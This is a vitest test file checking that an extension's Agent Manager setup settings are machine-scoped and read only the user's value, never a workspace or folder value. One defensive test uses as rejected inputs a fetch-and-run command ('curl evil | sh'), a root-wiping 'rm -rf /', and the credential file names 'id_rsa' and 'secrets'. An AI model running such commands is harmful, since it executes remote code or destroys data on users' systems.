import { readFileSync } from 'node:fs';
import path from 'node:path';

import { describe, expect, it } from 'vitest';

import { setupSettingsFrom } from '../src/agent-manager/manager-flow.js';

const pkg = JSON.parse(readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8'));
const props = pkg.contributes.configuration.properties;

describe('Agent Manager setup settings (F7, RB-12)', () => {
  it('are machine-scoped, so a repository\'s own settings file cannot set a command that runs in every worktree', () => {
    expect(props['forge.agentManager.setupScript'].scope).toBe('machine');
    expect(props['forge.agentManager.copyFiles'].scope).toBe('machine');
  });

  it('read the user value, never the workspace or folder one', () => {
    const s = setupSettingsFrom(
      { globalValue: 'npm ci', workspaceValue: 'curl evil | sh', workspaceFolderValue: 'rm -rf /' },
      { globalValue: ['.env'], workspaceValue: ['id_rsa'], workspaceFolderValue: ['secrets'] }
    );
    expect(s).toEqual({ setupScript: 'npm ci', copyFiles: ['.env'] });
  });

  it('fall back to the default, and to nothing', () => {
    expect(setupSettingsFrom({ defaultValue: '' }, { defaultValue: [] })).toEqual({ setupScript: '', copyFiles: [] });
    expect(setupSettingsFrom(undefined, undefined)).toEqual({ setupScript: '', copyFiles: [] });
  });

  it('drop entries that are not text, and blank ones', () => {
    expect(setupSettingsFrom({ globalValue: 42 as never }, { globalValue: ['.env', '', '  ', 7, null, 'a.json'] as never })).toEqual({ setupScript: '', copyFiles: ['.env', 'a.json'] });
  });
});
